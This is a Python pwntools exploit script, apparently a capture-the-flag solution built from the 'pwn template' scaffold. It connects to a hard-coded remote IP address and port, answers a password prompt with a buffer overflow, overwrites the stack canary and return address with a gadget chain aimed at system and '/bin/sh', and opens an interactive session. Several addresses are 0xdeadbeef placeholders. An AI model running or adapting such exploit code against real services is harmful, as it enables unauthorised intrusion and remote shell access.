#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='none')
exe = './target'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
host = "54.161.125.246"
port = 1005

puts_addr = 0x1588a
binsh_addr = 0xdeadbeef
system_addr = 0xdeadbeef
a0_gadget = 0x49714
canary = 0xdeadbeef

io = remote(host, port)
io.recvuntil('Password:')
#payload = 'A'*24 + p64(binsh_addr) + 'A'*8 + p64(system_addr)
payload = 'A'*24 + p64(binsh_addr) + 'A'*8 + p64(puts_addr)
io.sendline('A'*40 + p64(canary) + 'B'*8 + p64(a0_gadget) + payload)
io.interactive()
print io.recv()
